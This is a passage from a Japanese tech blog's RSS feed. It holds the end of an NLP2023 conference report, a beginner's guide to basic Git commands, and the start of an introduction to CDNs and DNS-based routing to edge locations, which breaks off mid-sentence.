と異なる事実を含む要約文をモデルが生成することがあります。<br>このようにモデルの入力に対して誤った事実を含む内容を出力してしまう現象をhallucinationと言いますが、この研究では忠実性を向上させhallucinationを抑える手法を提案しています。<br>著者らは、主流なデータセット中には原文書と異なる事実を含む正解要約文が多く存在しており、データセットのみに基づいた学習では不十分だと述べています。<br>提案手法は、データセットの学習に加えモデルが生成した要約文と原文書の一致率を報酬とした強化学習を組み合わせるというものです。<br>提案手法により忠実性が向上したと報告されています。<br>近年、ChatGPTを始めとした生成系AIが流行していますが、生成系AIにおいてhallucinationは見過ごせない問題です。<br>この研究のように、hallucinationを扱う研究はより重要になってくると思います。<br>今後が楽しみな研究です。 (加藤)</li><li><strong><a href="https://www.anlp.jp/proceedings/annual_meeting/2023/pdf_dir/B7-4.pdf">[B7-4]</a> Free Donut: E2E文書理解モデルにおけるAttentionを用いた文字領域アノテーション不要なテキスト検出手法の提案</strong><br>この研究では、既存のE2E文書理解モデルにおいて課題となっている、認識結果のテキスト位置情報を取得できないという問題を、推論時のモデル内のAttentionマップに着目することで解決する手法を提案しています。<br>E2E文書理解モデルは、テキストの検出、認識をそれぞれ別のモデルで行う従来の文書理解モデルと異なり、単一のモデルでテキストの検出、認識を行います。<br>そのため、モデルの学習に必要なアノテーションは、画像とそこに書かれているテキストの表層情報のみでよく、コストの高いテキスト位置のアノテーションが必要ないという点で優れています。<br>一方で、テキストの検出を明示的に行わないため、テキストの位置情報を取得できないという課題もあります。<br>この研究では、推論時のモデル内のAttentionマップに着目することで、この課題を解決しようとしています。<br>どの層のAttentionマップを用いるのが良いのか、Multi-headなAttentionマップに対してどのように平均を取るのが良いのか、などの分析が行われていたりと、とても興味深い研究でした。<br>最近話題となっているGPT4 (ChatGPT) も画像を入力可能になっていることを踏まえると、自然言語 + 画像の分野は今後もさらに発展していくことが期待されます。 (佐良)</li><li><strong><a href="https://www.anlp.jp/proceedings/annual_meeting/2023/pdf_dir/B1-1.pdf">[B1-1]</a> 計算資源が限られた複数組織での出力選択による協働の検討</strong><br>高度な計算資源と大量のデータを持たない小さな組織には、高性能な大規模ニューラルモデルの開発は難しいものです。<br>この論文では、そのような小さな組織がそれぞれ独自に開発したモデルを組み合わせた際のモデルの性能を検証しています。<br>独立に訓練された少訓練データかつ小サイズのモデル群と、多訓練データかつ大サイズの単独大モデルの英日翻訳の性能比較を行った結果、小モデル10個を組み合わせたモデルは、小モデルの10倍のデータ・3倍の規模のモデルの能力に匹敵する性能が達成されることが確認されました。<br>この研究を含め、巨大IT企業のデータに依存しないことを目的として、小規模のモデルを組み合わせることで高性能のモデルを作り出す研究が多数発表されていました。<br>これは、現在急速に発展しているブロックチェーンなどの分散型データベースの技術の目的と呼応したものとなっており、今後の発展が期待されます。 (細井)</li><li><strong><a href="https://www.anlp.jp/proceedings/annual_meeting/2023/pdf_dir/B8-2.pdf">[B8-2]</a> 画像キャプションを介した脳活動からの視覚体験再構成</strong><br>まず最初にこの論文の先行研究 (同じ著者) は、2023年6月開催予定のCVPR2023で採択されており、世界的にも注目されています。 (<a href="https://cinet.jp/japanese/news/20230323_9502/">https://cinet.jp/japanese/news/20230323_9502/</a>)<br>この研究の概要としては、脳の血流から活動状況を調べる機能的磁気共鳴画像法 (fMRI) の画像から視覚情報を読み取り映像化する内容となっております。<br>先行研究では脳活動情報から画像を生成していたようですが、脳活動情報の一部を言語化 (キャプション) してから画像生成することで先行研究より高精細で意味的に妥当な画像を出力する再構成性能 (デコード性能) を示すようになりました。<br>内容が複雑なので概要はざっくりとなってしまいましたが、研究自体がユニークで発想が面白いので個人的には必読な論文だと思います。<br>一方「NLPの研究というより画像や脳科学で別分野の研究では？」という意見もあると思いますが、NLP2023の発表の中にはStable DiffusionなどのText2Image技術を用いた「NLPの応用」を題材とした発表はいくつもありました。<br>これはStable DiffusionやChatGPTによる「AIの民主化」より別分野の研究者でも簡単に利用ができ、自由な発想が実現可能になった証でもあるのかなと思ったので、さまざまな分野が加速することを願いこの論文を紹介しました。 (岡本)</li><li><strong>緊急パネル : ChatGPTで自然言語処理は終わるのか？</strong><br>緊急パネル「ChatGPTで自然言語処理は終わるのか」では、日本におけるNLPの第一人者6名による白熱の議論が展開されました。<br>なぜこれほどまで急激な性能向上が起こったのか、誰ひとり分かっていないことも多く、現場には戸惑いの声も大きいように感じました。<br>世間では、AI (やそのひとつであるChatGPT) によって人間の仕事が奪われるのではないか、と危惧する声も聞こえます。<br>しかし、実際には未だ (少なくとも現代の弱い) AIは人間のように考えたり、感情を持つことはありません。<br>人間が「人間にしかできないこと」をするために、AIで解決できる課題にはAIを活用していくのが正しい向き合い方ではないかと思います。<br>これまで研究されてきた多くの問題は「ChatGPTで良いのでは？」と言われてしまうかもしれません。<br>しかし、その存在をネガティブに捉えず、ChatGPTで解決されうる課題には積極的にChatGPTを活用していくことで、新たな課題も浮き彫りになっていくのではないかと考えます。<br>大きな流れが変わる今こそチャンス、この姿勢を大事にしたいと思いました。</li></ul><h2 id="おわりに"><a href="#おわりに" class="headerlink" title="おわりに"></a>おわりに</h2><p>私はフューチャーに入社してからは初めて、個人としても約4年ぶりのオンサイト学会参加でしたが、現地ならではの盛り上がり、会場の一体感を感じることで自身のモチベーションにもつながるとても有意義な時間を過ごすことができました。</p><p>ChatGPTを始めとする大規模言語モデル (LLM)の出現により、アカデミア、産業界を問わず未だかつてない注目が自然言語処理に集まっています。</p><p>「ChatGPTで自然言語処理は終わったのか」<br>自分なりの答えを出すならば、「持てるものの自然言語処理」は終わったのではないかと思います。途方も無い資源・計算リソースを持つ一部の組織に閉じず、いかなる個人、企業も自己の業務・生産活動の効率化、洗練のため大規模モデルの恩恵に預かることができるようになったことは大きなチャンスです。</p><p>しかしながら、事実に沿わない文章の生成、プライバシーや倫理的な問題など、LLMを実社会で使われるシステムに組み込むためには乗り越えなくてはならない障壁も多数あります。そのような課題を乗り越え、非連続的な成長を遂げるためには、技術的な側面はもちろん、日々の業務の中でどのようにAIと人間の協調の可能性を見出していくかも重要と考えます。</p><p>SAIGでは技術と業務の両輪でLLMの実社会応用を推進していく仲間を募集しています。</p><p>興味のある方、ぜひ一緒に働きましょう！</p><p>新卒採用 : <a href="https://www.future.co.jp/recruit/recruit/rec-fresh/">https://www.future.co.jp/recruit/recruit/rec-fresh/</a><br>キャリア採用 : <a href="https://www.future.co.jp/recruit/recruit/rec-career/">https://www.future.co.jp/recruit/recruit/rec-career/</a></p><img src="/images/20230501a/7445BE2B-C25B-400D-BEAA-C3F00E1519D2_1_105_c.jpeg" alt="7445BE2B-C25B-400D-BEAA-C3F00E1519D2_1_105_c.jpeg" width="1024" height="768" loading="lazy">]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%8F%82%E5%8A%A0%E3%83%AC%E3%83%9D%E3%83%BC%E3%83%88/">参加レポート</category>
      
      <category domain="https://future-architect.github.io/tags/%E6%A9%9F%E6%A2%B0%E5%AD%A6%E7%BF%92/">機械学習</category>
      
      <category domain="https://future-architect.github.io/tags/NLP/">NLP</category>
      
      <category domain="https://future-architect.github.io/tags/%E8%87%AA%E7%84%B6%E8%A8%80%E8%AA%9E%E5%87%A6%E7%90%86/">自然言語処理</category>
      
      <category domain="https://future-architect.github.io/tags/AI/">AI</category>
      
      
      <comments>https://future-architect.github.io/articles/20230501a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>初心者による初心者のための Git 入門</title>
      <link>https://future-architect.github.io/articles/20230428a/</link>
      <guid>https://future-architect.github.io/articles/20230428a/</guid>
      <pubDate>Thu, 27 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230428a/top.png&quot; alt=&quot;&quot; width=&quot;588&quot; height=&quot;200&quot;&gt;

&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230428a/top.png" alt="" width="588" height="200"><h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p><a href="/articles/20230417a/">春の入門祭り連載</a> 10 日目です。</p><p>はじめまして。</p><p>フューチャーアーキテクト TIG の石野です。2022&#x2F;10 に IT 未経験でフューチャーに新卒入社しました。</p><p>フューチャーの新人研修ではじめて GitLab を触ったので、初心者目線で学んだことをまとめてみました。</p><p>本記事では Git についてなにも知らない人・初めて触る人向けにフューチャーの新人研修で必要になった知識という観点で説明していきます。<br>これからフューチャーの新人研修を受ける方はもちろん、Git についての基礎知識を学びたい方にぜひ読んでいただきたいと思います。</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>Git はバージョン管理ツールと呼ばれるものですが、バージョン管理ツールとは一体何かというところから基本的な Git コマンドについて以下の順番で説明します。</p><ul><li>バージョン管理ツールとは</li><li>集中型と分散型</li><li>GitLab と GitHub について</li><li>Git 基本用語</li><li>プル</li><li>ブランチ</li><li>コミット<ul><li>プッシュ</li></ul></li><li>基本の Git コマンド</li></ul><p>また、私が新人研修で大変お世話になった研修リーダーも研修について<a href="/articles/20230306a/">技術ブログ</a>を書いています。ぜひご覧ください。</p><h2 id="バージョン管理ツールとは"><a href="#バージョン管理ツールとは" class="headerlink" title="バージョン管理ツールとは"></a>バージョン管理ツールとは</h2><p>大学で卒業論文を書いた方ならきっと共感してもらえると思うのですが、私のパソコンでは卒論を書いたワードファイルが量産されていました。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">卒業論文.docx</span><br><span class="line">卒業論文_修正版.docx</span><br><span class="line">卒業論文_完成.docx</span><br><span class="line">卒業論文_完成2.docx</span><br><span class="line">卒業論文_最終版.docx</span><br></pre></td></tr></table></figure><p>これじゃどのファイルがどの順番でいつ作られたのか分かりませんね…</p><p>このようなファイルの変更履歴の管理をどうにかしてくれるのがバージョン管理ツールです。</p><p>ソースコードを複数人で開発するときに便利なため開発の現場でよく使われています。</p><h2 id="集中型と分散型"><a href="#集中型と分散型" class="headerlink" title="集中型と分散型"></a>集中型と分散型</h2><p>バージョン管理ツールには集中型と分散型が存在します。<br>以下では集中型と分散型のバージョン管理ツールそれぞれについて特徴を説明します。</p><h3 id="集中型"><a href="#集中型" class="headerlink" title="集中型"></a>集中型</h3><p>集中型のバージョン管理ツールでは、専用のサーバー上にあるリポジトリ（バージョン管理するファイルの保管場所）でファイルを管理します。</p><p>ファイルをバージョン管理する場合はリポジトリのあるサーバーに接続する必要があります。</p><p>集中型のバージョン管理ツールの例としては Subversion が挙げられます。</p><h3 id="分散型"><a href="#分散型" class="headerlink" title="分散型"></a>分散型</h3><p>分散型のバージョン管理ツールでは、サーバー上にあるリモートリポジトリのコピーをユーザーがローカルリポジトリに持つことができます。ユーザーはローカルリポジトリで開発を進め、ある程度作業が進んだらサーバーに接続しサーバー上のリモートリポジトリに変更を反映させます。集中型に比べて、複数人で作業をする際に非常に便利です。</p><p>Git はこの分散型のバージョン管理ツールのひとつです。</p><h2 id="GitLab-と-GitHub-について"><a href="#GitLab-と-GitHub-について" class="headerlink" title="GitLab と GitHub について"></a>GitLab と GitHub について</h2><p>Git については分かったけど、GitLab とか GitHub って言葉も聞いたことがあるな。Git と何が違うんだ？と思った方もいるかも知れません。</p><p>GitLab と GitHub はどちらも Git のホスティングサービスで、リモートリポジトリを提供しています。この 2 つ以外にも Git のホスティングサービスはいろいろあります。</p><h2 id="Git-基本用語"><a href="#Git-基本用語" class="headerlink" title="Git 基本用語"></a>Git 基本用語</h2><p>次に、Git の基本用語 4 つを説明します。</p><h3 id="プル"><a href="#プル" class="headerlink" title="プル"></a>プル</h3><p>分散型のバージョン管理ツールである Git にはリモートリポジトリとローカルリポジトリがあると説明しました。</p><p>プルはリモートリポジトリの内容をローカルリポジトリにコピーすることです。厳密には fetch と merge の 2 段階があり、単純にリモートリポジトリの内容をローカルリポジトリにコピーしているわけではないですが、慣れるまではコピーしていると考えてもよさそうです。</p><h3 id="ブランチ"><a href="#ブランチ" class="headerlink" title="ブランチ"></a>ブランチ</h3><p>ブランチとは枝という意味であり、Git ではソースコードを枝分かれして編集することができます。</p><p>たとえば、新機能である a を A さんが開発するとします。</p><p>その場合、A さんはリモートリポジトリからプルしてきたリーカルリポジトリ上で、 main ブランチから a ブランチを作って（ブランチを切るといいます）そのブランチ上で作業をします。そうすることで、A さんの作業中も main ブランチは常に安定した状態を保つことができます。</p><p>そして、機能 a の開発中に別の機能 b のバグ修正を B さんが行うことになった場合は、B さんは B さんのローカルリポジトリ上で main ブランチから fix_b ブランチを切ることで B さんは A さんとは独立して作業をすることができます。</p><p>fix_b ブランチでの修正が完了し、機能 b が問題なく動くことを確認できたら、 fix_bブランチを main ブランチに統合（マージ）することで main ブランチが更新されます。</p><h3 id="コミット"><a href="#コミット" class="headerlink" title="コミット"></a>コミット</h3><p>コミットするとはゲームでセーブデータを作るようなものです。</p><p>と先輩社員に教わったのですが、私はゲームに疎いのでちょっと理解に苦しみました。私のようにゲームに疎い人向けに説明すると、”コミットする”とは「あとあとこの時点に戻れたらうれしいな」というポイントに名前をつけて記録することです。</p><p>コミットした時点には後から戻ったり、コミット同士の違いを参照したりすることもできるのでうまく活用できると非常に便利です。</p><p>コミットはあとから消すこともできるので、いつコミットすれば分からないという方は迷ったらコミットしましょう。</p><p>コミットの頻度についてはいろいろ流派があるみたいなので、気になったら調べてみてください。私はまだ模索中です。</p><h3 id="プッシュ"><a href="#プッシュ" class="headerlink" title="プッシュ"></a>プッシュ</h3><p>プッシュとはプルとは逆にローカルリポジトリでの変更内容をリモートリポジトリに反映させることです。</p><p>リモートリポジトリにプッシュすることで自分が変更した内容を他の人も見ることができます。</p><h2 id="基本の-Git-コマンド"><a href="#基本の-Git-コマンド" class="headerlink" title="基本の Git コマンド"></a>基本の Git コマンド</h2><p>今紹介した、プル、ブランチ、コミット、プッシュを CLI （マウスなどではなくキーボードから入力するコマンドで PC を操作すること）で行う際の Git コマンドを紹介していきます。</p><ul><li><code>git pull origin &lt;ブランチ名&gt;</code><ul><li>リモートリポジトリにある指定したブランチをローカルリポジトリ上の現在のブランチにプルすることができます</li><li><code>origin</code> はリモートリポジトリの意味です</li></ul></li><li><code>git pull</code><ul><li>ブランチを指定しなかった場合は、現在のブランチに紐づいたブランチをプルします</li><li>あるブランチに紐づいたブランチを upstream branch と言い、明示的に設定できます</li><li>設定せずに <code>git pull</code> を実行するとプルはできません</li></ul></li></ul><p>git pull は前述の通り git fetch と git merge の 2 つのコマンドの組み合わせですが、新人研修のレベルではここまでの理解は必要ないので説明は割愛します。<br>本格的に Git を使うことになったら調べてみてください。</p><ul><li><code>git switch &lt;ブランチ名&gt;</code><ul><li>変更を加えるブランチが指定したブランチに切り替わります</li><li>他にもブランチを切り替えるコマンドとして <code>git checkout</code> というコマンドも存在します</li><li>私は、新人研修で最初に使ったのが <code>git switch</code> だったため <code>git checkout</code> はよく分かっていないですがどっちを使っても大丈夫です</li></ul></li><li><code>git switch -c &lt;ブランチ名&gt;</code><ul><li>指定したブランチ名のブランチを新しく作ります</li><li>このコマンドを実行した後は、変更を加えるブランチが作成されたブランチに切り替わります</li></ul></li><li><code>git add &lt;ファイルパス&gt;</code><ul><li>ステージエリアにファイルを追加します</li><li>ステージエリアがよく分からない方は、コミットの前に、<code>git add</code> コマンドでコミットするファイルを選んでると考えたら良いと思います</li></ul></li><li><code>git add --all</code><ul><li><code>--all</code> オプションを指定することで、変更した全てのファイルをコミットの対象とすることができます</li><li>いちいちファイルパスを指定するより楽ですが関係ないファイルも含まれてしまうので注意が必要です</li></ul></li><li><code>git add -u</code><ul><li><code>-u</code> オプションを指定することで、すでにバージョン管理されているファイルの中で変更があったもののみをコミットの対象とすることができます</li><li>新規に作成したファイルはコミットの対象となりません</li></ul></li><li><code>git commit -m &lt;コミットメッセージ&gt;</code><ul><li>ステージエリアにあるファイルをコミットメッセージを指定して、コミットすることができます</li></ul></li><li><code>git commit</code><ul><li>オプションを省略するとコミットメッセージを入力するためのテキストエディタが開きます</li><li>この際に開くテキストエディタは設定することができるので使い慣れたものを設定するのがおすすめです</li><li>よく分からんという方は <code>-m</code> でメッセージを指定しておきましょう</li></ul></li><li><code>git status</code><ul><li>ファイルの状態が確認できるので、<code>git add</code> する前後に使うことが多いコマンドです</li><li>確認できるのは<ul><li>変更された&#x2F;新規作成されたファイル一覧</li><li><code>git add</code> 済みのファイル一覧　です</li></ul></li></ul></li><li><code>git push origin &lt;ブランチ名&gt;</code><ul><li>指定したブランチに現在のブランチをプッシュします</li></ul></li></ul><h2 id="さいごに"><a href="#さいごに" class="headerlink" title="さいごに"></a>さいごに</h2><p>バージョン管理ツールに馴染みがない方は、このような記事を読んでもなかなか理解が進まないと思うので、実際に手元で動かしてみるのが一番良い習得方法だと思います。</p><p>また、本記事ではフューチャーの新人研修で必要になる知識という観点で絞って説明しましたが、開発の現場で使うとなるともちろんこれらの知識だけでは足りないので、他のコマンドやブランチ運用なども調べてみてください。（私は絶賛勉強中です。）</p><p>次は伊藤さんの<a href="/articles/20230502a/">cf-terraformingで入門するCloudflare</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85%E5%90%91%E3%81%91/">初心者向け</category>
      
      <category domain="https://future-architect.github.io/tags/Git/">Git</category>
      
      
      <comments>https://future-architect.github.io/articles/20230428a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CDN 入門とエッジでのアプリケーション実行</title>
      <link>https://future-architect.github.io/articles/20230427a/</link>
      <guid>https://future-architect.github.io/articles/20230427a/</guid>
      <pubDate>Wed, 26 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;こんにちは。Technology Inovation Group（TIG）所属の小澤です。&lt;br&gt;&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>こんにちは。Technology Inovation Group（TIG）所属の小澤です。<br><a href="/articles/20230417a/">春の入門祭り連載</a> 9 日目を担当します。</p><p>私は、通常の業務とは別に社員有志で集まるクラウド勉強会に参加しています。まだ経験が浅い（2022年10月新卒入社）こともあり、クラウド勉強会では入門的な内容を中心に発表しています。</p><p>この記事では、私がクラウド勉強会で発表した <strong>CDN の入門とエッジロケーションでのアプリケーション実行</strong>について説明します。</p><h2 id="CDN-とは？"><a href="#CDN-とは？" class="headerlink" title="CDN とは？"></a>CDN とは？</h2><p><strong>CDN</strong> （content delivery network, コンテンツ配信ネットワーク）は、Web アプリを含めた Web サイトのコンテンツ（HTML&#x2F;CSS&#x2F;JS&#x2F;画像など）を高速配信するための仕組みです。</p><p>通常、 Web サイトの静的コンテンツ（HTML&#x2F;CSS&#x2F;JS&#x2F;画像など）は Web サーバーに配置します。この場合、例えば全てのアクセスを単一の Web サーバーで担当するように構成すると、アクセスが集中するような時間帯や、通信する場所によって反応が遅くなってしまうことがあります。</p><p>これを解消する 1 つの方法は、Webサーバーの前に<strong>ロードバランサー</strong>を入れて負荷分散を実現することです。 しかし、単にロードバランサーを導入するだけでは、世界中からのアクセスがある場合など、<strong>地理的な距離に起因する遅延</strong>は解消できません。この課題は、オンプレミスでもクラウドでも同様に生じます。</p><p>そこで、サーバーへの負荷分散と地理的な制約による遅延軽減を同時に実現できるのが CDN です。</p><p>CDN では、コンテンツが入っている元の Web サーバー（<strong>オリジンサーバー</strong>）へのアクセス集中を防ぎ、地理的に近い<strong>エッジロケーション</strong>（エッジサーバー）に誘導します。エッジロケーションはデータセンターの一種ですが、世界中に配置され、クラウドの通常リージョンのデータセンターよりも多く設置されています。CDN の標準的な方法では、エッジロケーションはユーザーからのアクセスがあると、オリジンサーバを参照して次回以降のアクセスのためにコンテンツをキャッシュしておきます。次回以降のアクセスでは、キャッシュしたコンテンツをユーザーに配信します。</p><p>こうすることで、<strong>本来はオリジンサーバーにアクセスするはずだったリクエストを、エッジロケーションが代理して担当する</strong>ことで、負荷分散と地理的な高速配信を実現できます。</p><p>なお、エッジロケーションはオリジンサーバーのコンテンツをキャッシュしているだけなので、当然データの整合性は一時的に取れなります。そのため、通常の CDN サービスでは、キャッシュを保持する期間（<strong>TTL</strong>, time to live）を設定できるようになっています。 整合性を高く保ちたい場合はキャッシュの保持期間を短くすればよいわけです。 もちろん短くしすぎると、CDN の負荷分散の利点は弱くなるので、要件に応じてバランスを判断する必要があります。</p><h2 id="CDN-の仕組み"><a href="#CDN-の仕組み" class="headerlink" title="CDN の仕組み"></a>CDN の仕組み</h2><p>CDN は、<strong>地理的に近いエッジロケーションに誘導する</strong>と説明しましたが、実際はどのようにこの仕組みを実現しているのでしょうか？</p><p>CDN 利用時も、クライアント（Web ブラウザなど）は、通常時と同じくオリジンサーバーに向けたリクエストを送信します。 当然、クライアントはサーバーが CDN を使っているかどうかを意識する必要はありません。クライアントは飽くまでオリジンサーバーに向けたリクエストを発するわけです。</p><p>そこで、 CDN の実現のためには、オリジンサーバーに向かっているリクエストを、エッジロケーションに向ける仕組みが必要です。</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>その方法として、通常は <strong>DNS</strong>（domain name system） の仕組みを利用することで、地理的に近いエッジロケーションへのリクエストを実現します。DNS は、クライアントがアクセスしようとしているドメインを IP アドレスに名前解決（変換）する仕組みです。例えば、<code>google.com</code> をドメインを <code>172.217.31.174</code> という IP アドレスに変換します。</p><p>一般的に、クライアントがリクエストを送るとき、まず組織内や ISP などの DNS サーバーにドメインの名前解決を要求します。 組織内や ISP などの DNS サーバーは通常、<strong>DNS キャッシュサーバー</strong>と呼ばれ、自分自身での名前解決ができないため、別の DNS サーバーに再問合せをします。 このように問合せを繰り返し（<strong>反復的問合せ</strong>）、最終的に<strong>権威 DNS サーバー</strong>にたどり着きます。 権威 DNS サーバーは、対象のドメインと IP アドレスの対応を管理しているので、それを元にクライアントへ IP アドレスを応答できます。</p><h3 id="オリジンサーバーのドメインと-CDN-用ドメインの紐づけ"><a href="#オリジンサーバーのドメインと-CDN-用ドメインの紐づけ" class="headerlink" title="オリジンサーバーのドメインと CDN 用ドメインの紐づけ"></a>オリジンサーバーのドメインと CDN 用ドメインの紐づけ</h3><p>CDN を実現するための設定として、通常は CNAME レコードを用いてオリジンサーバーのドメインと CDN 用ドメインを紐づけます。</p><p>CNAME レコードは、ドメインと IP アドレスではなく、ドメインと別名ドメインを紐づける仕組みです。</p><p>例えば、<code>example.com</code> というオリジンサーバーに対して、<code>cdn.example.com</code> といった CDN 用ドメインを紐づけます。 ただし、CDN 用ドメインは通常 CDN ベンダーが発行するため、この例のようにシンプルな形式とは限りません。</p><p>※example.com は例示に利用できるドメインです。</p><h3 id="CDN-用ドメインに対応する-IP-アドレスの動的な名前解決"><a href="#CDN-用ドメインに対応する-IP-アドレスの動的な名前解決" class="headerlink" title="CDN 用ドメインに対応する IP アドレスの動的な名前解決"></a>CDN 用ドメインに対応する IP アドレスの動的な名前解決</h3><p>CDN を実現する肝となる仕組みがここです。 CDN 用ドメインは CDN ベンダーが管理しているため、権威 DNS サーバーの挙動は CDN ベンダーで決めることができます。</p><p>CDN を構成しない場合、権威 DNS サーバーは通常固定の IP アドレスを応答します。 しかしながら、CDN を構成する場合、固定の IP アドレスでは、地理的に近いエッジロケーションにアクセスさせるという要件を達成できません。</p><p>そこで、 <strong>CDN ベンダーの権威 DNS サーバーは、CDN 用ドメインに対応する IP アドレスを動的に変換して応答します</strong>。</p><p>その際、一般的には送信元の IP アドレスや AS （Autonomous System, ネットワーク群）を読み取り利用することで、最寄りのエッジロケーションを導出します。</p><p>例えば、</p><div class="scroll"><table><thead><tr><th>送信元の IP アドレス（範囲）</th><th>最短のエッジロケーション</th><th>最短のエッジロケーションの IP アドレス</th></tr></thead><tbody><tr><td>192.0.2.0</td><td>エッジロケーション A</td><td>203.0.113.0</td></tr><tr><td>192.0.2.1</td><td>エッジロケーション A</td><td>203.0.113.0</td></tr><tr><td>192.0.2.25</td><td>エッジロケーション A</td><td>203.0.113.0</td></tr><tr><td>198.51.100.0</td><td>エッジロケーション B</td><td>203.0.113.50</td></tr><tr><td>198.51.100.33</td><td>エッジロケーション B</td><td>203.0.113.50</td></tr></tbody></table></div><p>のようなイメージです。</p><p>※192.0.2.0&#x2F;24、198.51.100.0&#x2F;24、203.0.113.0&#x2F;24 は例示に利用できる IP アドレスブロックです。 実在する IP アドレスではありません。</p><p>以上のように、CDN では</p><ul><li>オリジンサーバーのドメインと CDN 用ドメインの紐づけ</li><li>CDN 用ドメインに対応する IP アドレスの動的な名前解決</li></ul><p>を用いて、オリジンサーバーへのリクエストを地理的に近いエッジロケーションへのリクエストに振り替るのが一般的です。</p><h2 id="CDN-サービスの例"><a href="#CDN-サービスの例" class="headerlink" title="CDN サービスの例"></a>CDN サービスの例</h2><p>ここでは、CDN サービスの例を各クラウドベンダーごとに簡単に紹介します。</p><h3 id="AWS-Amazon-CloudFront"><a href="#AWS-Amazon-CloudFront" class="headerlink" title="AWS - Amazon CloudFront"></a>AWS - Amazon CloudFront</h3><p>AWS の提供する CDN サービスは Amazon CloudFront です。</p><p>Amazon CloudFront では、CDN のオリジンサーバーとして EC2 や S3、ELB などの他、オンプレミスのサーバーも指定できます。</p><h3 id="Google-Cloud-Cloud-CDN"><a href="#Google-Cloud-Cloud-CDN" class="headerlink" title="Google Cloud - Cloud CDN"></a>Google Cloud - Cloud CDN</h3><p>Google Cloud の提供する CDN サービスは Cloud CDN です。</p><p>Cloud CDN は他の CDN サービスと構成が異なり、Cloud Load Balancing に CDN 機能を付けるという方式で設定します。すなわち、Cloud CDN はロードバランサーと CDN が一体化している形です。</p><p>現在は CDN 機能付きロードバランサーのバックエンドとして、Cloud Storage やオンプレミスなど、HTTP 対応のあらゆる送信元を指定できるようになっているので、方式の違いをそこまで意識することなく、他の CDN サービスと同様に利用できます。</p><h3 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h3><p>Cloudflare はクラウドベンダーのひとつです。</p><p>もとは CDN をメインで提供するクラウドベンダーとして知られていましたが、純粋な CDN だけではなく、WAF（Web Application Firewall）などのセキュリティ機能も合わせて提供しています。</p><h2 id="モダンな-Web-アプリケーションと-CDN"><a href="#モダンな-Web-アプリケーションと-CDN" class="headerlink" title="モダンな Web アプリケーションと CDN"></a>モダンな Web アプリケーションと CDN</h2><p>近年の Web アプリケーションは、Web フロントエンドと Web API サーバーを分離した構成が主流です。 Web フロントエンドは、サーバー側で HTML を動的に生成するサーバーサイドレンダリング（SSR）ではなく、ブラウザの JavaScript が DOM を操作して軽量の HTML を書き換えるシングルページアプリケーション（SPA）の方式が一般的です。</p><p>また、SPA のデメリットを克服するために SPA と SSR を組み合わせた方式も主流になってきました。例えば、React ベースのフレームワークである Next.js や、Vue.js ベースのフレームワークである Nuxt.js を使えば、SPA と SSR の組み合わせを簡単に実現できます。</p><p>このようなモダンな Web アプリケーションの構成では、ブラウザ側の JavaScript の役割が大きくなり、必然的に JS ファイルのサイズが大きくなります。また静的サイトジェネレータ（SSG）を用いて Web サイトをビルドした場合も、HTML と JavaScript のサイズが大きくなります。</p><p>こうしたモダンな構成は、静的コンテンツとしての HTML&#x2F;JavaScript を高速に配信する CDN との相性が良く、広く使われています。</p><h2 id="CDN-は意識して設定しなくても使える"><a href="#CDN-は意識して設定しなくても使える" class="headerlink" title="CDN は意識して設定しなくても使える"></a>CDN は意識して設定しなくても使える</h2><p>SPA からなるモダンな Web アプリケーションを開発する場合、CDN の設定を意識しなくても CDN を適用したデプロイが簡単にできる仕組みが整っています。</p><h3 id="Vercel"><a href="#Vercel" class="headerlink" title="Vercel"></a>Vercel</h3><p>Next.js 開発元の Vercel 社が提供するクラウドサービスの Vercel は、Next.js をはじめとするモダン Web アプリケーションのデプロイ先として優れています。</p><p>GitHub 等のリモートリポジトリに Next.js アプリがコミットされるだけで、自動デプロイされ Next.js の機能をサーバーの設定なしに使用できます。その 1 つの機能として、<strong>CDN も自動で構成されます</strong>。</p><h3 id="AWS-Amplify"><a href="#AWS-Amplify" class="headerlink" title="AWS Amplify"></a>AWS Amplify</h3><p>AWS の提供する AWS Amplify は、モダンな Web アプリケーションを高速に開発しデプロイするための一連の機能を集めたサービスです。 AWS Amplify は、フルマネージド型のウェブアプリケーションホスティングサービスとして利用できます。</p><p>AWS Amplify は、<strong>利用されているフロントエンドフレームワークを自動で判別して CDN を構成します</strong>。 Vercel と同様、リモートリポジトリを指定すれば CI&#x2F;CD も面倒な設定なしに構成できます。</p><p>AWS Amplify でデプロイした Web フロントエンドと、Amazon API Gateway や AWS Lambda と組み合わせてサーバーレスな Web アプリケーションを構成できます。</p><h2 id="CDN-の活用とビジネス形態"><a href="#CDN-の活用とビジネス形態" class="headerlink" title="CDN の活用とビジネス形態"></a>CDN の活用とビジネス形態</h2><p>CDN は、その特徴から</p><ul><li>地理的に離れた場所にユーザーがいる</li><li>厳しい低遅延性が求められる</li></ul><p>という場面に有益です。</p><p>このような場面にまず当てはまるのが、toC の Web サービスでしょう。世界的なサービスはもちろんのこと、日本国内向けのサービスであったとしても CDN 